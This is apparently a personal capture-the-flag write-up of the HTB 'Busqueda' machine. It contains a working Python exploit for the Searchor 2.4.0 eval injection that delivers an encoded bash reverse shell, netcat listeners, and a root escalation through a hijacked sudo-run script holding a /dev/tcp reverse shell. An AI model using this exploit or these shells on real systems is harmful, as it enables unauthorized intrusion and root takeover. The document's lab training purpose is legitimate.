## ***Warning: This tutorial is for educational purposes only. Do not try any techniques discussed here on systems you do not own or without explicit permission from the owner.***

Hello!  I am going to go over how I solved the HTB challenge "Busqueda". This challenge mainly goes over red-team fundamentals like port scanning, exploit development, getting a reverse shell, and linux privilege escalation. 

Let's get started:
### Connecting to the Lab:
You can use HTB's VPN connection or with their Pwnbox. I am going to connect over OpenVPN using a local VM I spun up of ParrotOS. 

If you connect via OpenVPN, you can use the following command once you receive the .ovpn file from HTB:

```bash
sudo openvpn lab_willanalyze.ovpn
```

This will initiate a giant wall of text that details your connection. As long as you see the words "Initialization Sequence Completed" in that wall, you should be good to go!

### Reconnaissance and Data Gathering:

#### nmap:

For those who don't know, nmap is a port scanning tool used for a variety of purposes. This includes, but is not limited to, system reconnaissance, security auditing, and troubleshooting

nmap is extremely versatile and I highly recommend you go through the documentation to learn about everything nmap can do: https://nmap.org/docs.html

That said, I am going to keep it simple with my command. This is the nmap command I almost always start with on easy HTB boxes as it usually gets me most of the info I need. 

```bash
nmap -sC -sV [INSERT_IP_HERE]
#ol’ reliable
```

To recap what this command means:
**-sV** tells nmap to find, if possible, the version of software. This is extremely important from an attacker's perspective as this could potentially find out-of-date software that can be exploited.
**-sC** tells nmap to run a list of default scripts against the host to check things like supported ciphers, http headers, ssh-hostkeys, etc.

Here is what I got:

![](/assets/img/htb_busqueda/Screenshot_From_2024-10-02_22-00-47.png)

Three main ports open: port 22 running ssh, port 80 running http with the http-title of searcher.htb. I am going to go for the http site first as this will likely be the easiest to access and exploit. Before we do so, I will need to update the hosts file
#### etc/hosts

Before we go any further, I want to add a domain name in the hosts file for easier reference. 

You can add the entry manually using a text editor like Vim, NeoVim, or Nano but I will just stick with a simple echo pipe:

```bash
sudo echo “[INSERT_IP_HERE] searcher.htb” > /etc/hosts
```

Now if we go to http://searcher.htb, we should see the page come up:

![](/assets/img/htb_busqueda/Screenshot_From_2024-10-02_22-10-15.png)

on the bottom, we should see "Powered by [Flask](https://flask.palletsprojects.com) and [Searchor 2.4.0](https://github.com/ArjunSharda/Searchor)"

We could look for associated CVEs on either Flask or Searchor. I am going to prioritize searchor as it seems to be a more niche software without as much support as flask.

Searchor seems to be a python search utility (get it? busqueda in spanish means search).

Eventually, we see CVE-2023-43364:

NIST listing: https://nvd.nist.gov/vuln/detail/CVE-2023-43364

Github advisory: https://github.com/advisories/GHSA-66m2-493m-crh2

It looks like there was an eval function that allowed an attacker to execute arbitrary code:

``` python
@click.argument("query")
def search(engine, query, open, copy):
    try:
        url = eval( # <<< See here 
            f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
        )
        click.echo(url)
        searchor.history.update(engine, query, url)
        if open:
            click.echo("opening browser...")
	  ...
```

You can see a couple of PoC exploits already written for us (example: https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection)

However, I want to work on my exploit writing, so I am going to go ahead and see if I can get my own code to work.

My python is a bit rusty, so if you see bad coding practices, no you didn't.
### Weaponization

``` python
import sys
import os
import base64
import requests

# argument input code adapted from: https://github.com/spookier/Maltrail-v0.53-Exploit/blob/main/exploit.py

#reverse shell code based on https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection

# bash command that will be used as the payload

def rev_shell(my_ip, my_port, target):

rev_shell_cmd = "bash -c \'bash -i >& /dev/tcp/" + my_ip + "/" + my_port + " 0>&1\'"
rev_shell_cmd_encode = rev_shell_cmd.encode()
rev_shell_cmd_b64 = base64.b64encode(rev_shell_cmd_encode).decode()
python_encap = "\',__import__(\'os\').system(\'echo " + rev_shell_cmd_b64 + " |base64 -d|bash -i\'))"
python_encap_formatted = python_encap.replace(" ","+")
post_target = target + "/searchengine=Google&query=" + python_encap_formatted

print (post_target)

post_req = requests.post(post_target)

# accepts main arguments

def main():

listening_IP = None
listening_PORT = None
target_URL = None

# checks number of arguments to prevent typos and incorrect args

if len(sys.argv) != 4:
print("Error. Needs listening IP, PORT and target URL.")
return(-1)
# sets vars based on arguments

listening_IP = sys.argv[1]
listening_PORT = sys.argv[2]
target_URL = sys.argv[3]

print("Running exploit on " + str(target_URL))

rev_shell(listening_IP, listening_PORT, target_URL)

if __name__ == "__main__":
main()
```
Now that we understand what the exploit is doing, we are going to go ahead and run it

### Delivery/Exploit/Installation

Before we start the exploit, we need a netcat instance to accept our reverse shell

``` bash
nc -nlvp 8080 -s [INSERT_LOCAL_VPN_IP_HERE]
```

to break down this input:

**nc**: stands for netcat, a networking tool that allows for us to open up ports and make connections (among other things)
**-lnvp** is just the four following flags combined into one for convenience:
	**-l**: means it is using a listening port
	**-n**: numeric IP only (I haven't given my workstation a hostname so I'm only using IP)
	**-v**: verbose output, helpful for troubleshooting
	**-p**: indicates that we will be specifying the port number. I did 8080, but you can chose any valid port number not currently in use
**8080**: the port number we are using
**-s**: local source address, insert your IP that HTB assigned your machine via VPN. You can either find it through the command line with commands like **ifconfig**, **ip address**, or you can just find it in your machine connection:

**heads up: you may need root permissions to open up a port, in which case just put a "sudo" at the beginning**

Now just run this command and we should be ready to go:

``` bash
python3 exploit.py [INSERT_LOCAL_VPN_IP_HERE] 8080 [INSERT_TARGET_URL_HERE]
```
Looks like we now have revshell as a user named svc:

![](/assets/img/htb_busqueda/Screenshot_From_2024-10-28_21-34-58.png)

### Command and Control

It seems as though we already have a normal user, and if we navigate to the home directory we should see user.txt which contains our user flag.

I recommend a break here as we just did quite a bit.

Now let's see if we can get root.

### Privilege escalation

Here we can upload linpeas or something of that nature. While that would work, I want to try and get low hanging fruit with a simple "sudo -l"

![](/assets/img/htb_busqueda/Screenshot_From_2024-11-05_21-15-11.png)

Looks like there is a python script that the user can execute as root, but not read or write.

![](/assets/img/htb_busqueda/Screenshot_From_2024-11-05_21-26-36.png)

Executing it, we get a couple options, but I chose to go with the "full-checkup" in order to get a larger picture as to what the script does.

It looks like there is an instance of gitea on the server, I am going to add "gitea.searcher.htb" to the etc/hosts and navigate to the site:

![](/assets/img/htb_busqueda/Screenshot_From_2024-11-09_22-29-23.png)

Going through the site, this mainly looks like a git service that is used to maintain the site.

I also see that the version is Gitea Version: 1.18.0+rc1, let's see if there are any associated CVEs:

![](/assets/img/htb_busqueda/Screenshot_From_2024-11-09_22-30-48.png)

While there are CVEs associated with Gitea, there aren't any associated with this current version. Looks like we are going to have to get creative:

![](/assets/img/htb_busqueda/Screenshot_From_2024-11-09_22-53-02.png)

I do notice that full-checkup appears to be a bash file that get executed *with sudo privileges!* by the python script. While we can't edit this file, we could potentially make our own that will give us a reverse shell running as root.

This is a really handy resource for making reverse shells in various languages:

https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

I will be doing a classic bash reverse shell one-liner from the above resource to point to our attack machine:

``` bash
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.10.14.186/8080 0>&1'
```

From here, we will create a new full-checkup.sh in the tmp directory and run the system-checkup.py and receive the shell on our machine:

Also make sure that you have a netcat session setup on the port of your choice:

``` bash
nc -nlvp 8080 -s 10.10.14.186
```

I did the following steps to create the file:

![](/assets/img/htb_busqueda/Screenshot_From_2024-11-10_00-14-11.png)

Be sure to act quickly though, as the file will be deleted quickly

![](/assets/img/htb_busqueda/Screenshot_From_2024-11-10_00-15-14.png)

We now have root, navigate to the root directory and grab the flag.

Hope this helped, happy hacking!
